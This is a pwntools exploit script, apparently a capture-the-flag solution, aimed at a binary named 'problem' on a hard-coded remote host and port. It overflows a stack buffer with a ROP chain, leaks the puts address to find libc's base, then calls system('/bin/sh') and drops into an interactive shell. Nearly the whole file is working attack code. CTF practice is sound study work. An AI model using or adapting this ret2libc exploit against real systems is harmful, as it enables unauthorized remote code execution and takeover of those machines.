#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host 103.152.242.242 --port 30153 ./problem
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./problem')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or '103.152.242.242'
port = int(args.PORT or 30153)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak *0x{exe.entry:x}
b *0x40084e
b *0x400835
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

io = start()
# libc =ELF("/usr/lib/x86_64-linux-gnu/libc-2.31.so")
libc =ELF("./libc.so")
win = 0x4007b6
pop_rdi = 0x0000000000400923
pop_rsi = 0x0000000000400921
puts_got= exe.got['puts']
puts_plt = exe.plt['puts']
func_fgets=0x400836

p = 'a'*9
p += p64(pop_rdi)
p += p64(puts_got)
p += p64(puts_plt)
p += p64(func_fgets)

io.sendlineafter("t\n",p)

data = u64(io.recvline()[:-1].ljust(8,"\x00"))
print hex(data)
libc.address = data - libc.sym['puts']
print hex(libc.address)

binsh= libc.search("/bin/sh").next()
system = libc.sym['system']

p = 'a'*9
p += p64(pop_rdi)
p += p64(binsh)
p += p64(pop_rdi+1)
p += p64(system)

io.sendline(p)

io.interactive()

